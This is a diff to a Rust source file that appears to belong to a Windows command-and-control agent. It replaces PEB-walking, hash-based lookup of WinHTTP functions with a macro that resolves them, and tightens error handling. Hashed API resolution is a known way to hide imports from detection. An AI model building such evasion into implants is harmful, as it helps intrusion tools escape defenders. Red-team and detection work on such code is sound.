@@ -5,7 +5,6 @@ use alloc::{
 };
 use core::{
     ffi::c_void,
-    mem::transmute,
     ptr::{null, null_mut},
     sync::atomic::{AtomicBool, Ordering},
 };
@@ -14,7 +13,19 @@ use kageshirei_win32::{
     ntdef::UnicodeString,
     winhttp::{
         WinHttp,
+        WinHttpAddRequestHeadersFunc,
+        WinHttpCloseHandleFunc,
+        WinHttpConnectFunc,
         WinHttpError,
+        WinHttpGetIEProxyConfigForCurrentUserFunc,
+        WinHttpGetProxyForUrlFunc,
+        WinHttpOpenFunc,
+        WinHttpOpenRequestFunc,
+        WinHttpQueryHeadersFunc,
+        WinHttpReadDataFunc,
+        WinHttpReceiveResponseFunc,
+        WinHttpSendRequestFunc,
+        WinHttpSetOptionFunc,
         HTTP_QUERY_STATUS_CODE,
         WINHTTP_ACCESS_TYPE_NO_PROXY,
         WINHTTP_FLAG_BYPASS_PROXY_CACHE,
@@ -22,16 +33,13 @@ use kageshirei_win32::{
         WINHTTP_QUERY_FLAG_NUMBER,
     },
 };
-use mod_agentcore::{
-    instance,
-    ldr::{peb_get_function_addr, nt_get_last_error},
-};
+use mod_agentcore::{instance, ldr::nt_get_last_error, resolve_direct_syscalls};
 
 use crate::utils::{parse_url, to_pcwstr};
 
-// Global variable to store WinHTTP functions
+/// Global variable to store WinHTTP functions
 static mut WINHTTP_FUNCS: Option<WinHttp> = None;
-// Atomic variable to track if WinHTTP functions have been initialized
+/// Atomic variable to track if WinHTTP functions have been initialized
 static INIT_WINHTTP: AtomicBool = AtomicBool::new(false);
 
 /// Initializes WinHTTP functions.
@@ -73,7 +81,7 @@ fn init_winhttp_funcs() {
             }
 
             if winhttp_handle.is_null() {
-                return;
+                panic!("Failed to load winhttp.dll");
             }
 
             let h_module = winhttp_handle as *mut u8;
@@ -82,37 +90,73 @@ fn init_winhttp_funcs() {
                 panic!("Failed to load winhttp.dll");
             }
 
-            // Load function addresses from the module
-            let win_http_open_addr = peb_get_function_addr(h_module, WINHTTP_OPEN_DBJ2);
-            let win_http_connect_addr = peb_get_function_addr(h_module, WINHTTP_CONNECT_DBJ2);
-            let win_http_open_request_addr = peb_get_function_addr(h_module, WINHTTP_OPEN_REQUEST_DBJ2);
-            let win_http_set_option_addr = peb_get_function_addr(h_module, WINHTTP_SET_OPTION_DBJ2);
-            let win_http_close_handle_addr = peb_get_function_addr(h_module, WINHTTP_CLOSE_HANDLE_DBJ2);
-            let win_http_send_request_addr = peb_get_function_addr(h_module, WINHTTP_SEND_REQUEST_DBJ2);
-            let win_http_add_request_headers_addr = peb_get_function_addr(h_module, WINHTTP_ADD_REQUEST_HEADERS_DBJ2);
-            let win_http_receive_response_addr = peb_get_function_addr(h_module, WINHTTP_RECEIVE_RESPONSE_DBJ2);
-            let win_http_read_data_addr = peb_get_function_addr(h_module, WINHTTP_READ_DATA_DBJ2);
-            let win_http_query_headers_addr = peb_get_function_addr(h_module, WINHTTP_QUERY_HEADERS_DBJ2);
-            let win_http_get_ie_proxy_config_addr =
-                peb_get_function_addr(h_module, WINHTTP_GET_IE_PROXY_CONFIG_FOR_CURRENT_USER_DBJ2);
-            let win_http_get_proxy_for_url_addr = peb_get_function_addr(h_module, WINHTTP_GET_PROXY_FOR_URL_DBJ2);
-
             let mut winhttp_functions = WinHttp::new();
 
-            // Transmute function addresses to their respective types
-            winhttp_functions.win_http_open = transmute(win_http_open_addr);
-            winhttp_functions.win_http_connect = transmute(win_http_connect_addr);
-            winhttp_functions.win_http_open_request = transmute(win_http_open_request_addr);
-            winhttp_functions.win_http_set_option = transmute(win_http_set_option_addr);
-            winhttp_functions.win_http_close_handle = transmute(win_http_close_handle_addr);
-            winhttp_functions.win_http_send_request = transmute(win_http_send_request_addr);
-            winhttp_functions.win_http_add_request_headers = transmute(win_http_add_request_headers_addr);
-            winhttp_functions.win_http_receive_response = transmute(win_http_receive_response_addr);
-            winhttp_functions.win_http_read_data = transmute(win_http_read_data_addr);
-            winhttp_functions.win_http_query_headers = transmute(win_http_query_headers_addr);
-            winhttp_functions.win_http_get_ie_proxy_config_for_current_user =
-                transmute(win_http_get_ie_proxy_config_addr);
-            winhttp_functions.win_http_get_proxy_for_url = transmute(win_http_get_proxy_for_url_addr);
+            resolve_direct_syscalls!(
+                h_module,
+                [
+                    (
+                        winhttp_functions.win_http_open,
+                        WINHTTP_OPEN_DBJ2,
+                        WinHttpOpenFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_connect,
+                        WINHTTP_CONNECT_DBJ2,
+                        WinHttpConnectFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_open_request,
+                        WINHTTP_OPEN_REQUEST_DBJ2,
+                        WinHttpOpenRequestFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_set_option,
+                        WINHTTP_SET_OPTION_DBJ2,
+                        WinHttpSetOptionFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_close_handle,
+                        WINHTTP_CLOSE_HANDLE_DBJ2,
+                        WinHttpCloseHandleFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_send_request,
+                        WINHTTP_SEND_REQUEST_DBJ2,
+                        WinHttpSendRequestFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_add_request_headers,
+                        WINHTTP_ADD_REQUEST_HEADERS_DBJ2,
+                        WinHttpAddRequestHeadersFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_receive_response,
+                        WINHTTP_RECEIVE_RESPONSE_DBJ2,
+                        WinHttpReceiveResponseFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_read_data,
+                        WINHTTP_READ_DATA_DBJ2,
+                        WinHttpReadDataFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_query_headers,
+                        WINHTTP_QUERY_HEADERS_DBJ2,
+                        WinHttpQueryHeadersFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_get_ie_proxy_config_for_current_user,
+                        WINHTTP_GET_IE_PROXY_CONFIG_FOR_CURRENT_USER_DBJ2,
+                        WinHttpGetIEProxyConfigForCurrentUserFunc
+                    ),
+                    (
+                        winhttp_functions.win_http_get_proxy_for_url,
+                        WINHTTP_GET_PROXY_FOR_URL_DBJ2,
+                        WinHttpGetProxyForUrlFunc
+                    )
+                ]
+            );
 
             // Store the functions in the global variable
             WINHTTP_FUNCS = Some(winhttp_functions);
@@ -130,6 +174,11 @@ fn init_winhttp_funcs() {
 ///
 /// # Returns
 /// * `&'static WinHttp` - A reference to the initialized WinHTTP functions.
+#[expect(
+    static_mut_refs,
+    reason = "Access to mutable static data is protected by a RwLock, ensuring shared references are safe and \
+              preventing data races."
+)]
 pub fn get_winhttp() -> &'static WinHttp {
     init_winhttp_funcs();
     return unsafe { WINHTTP_FUNCS.as_ref().unwrap() };
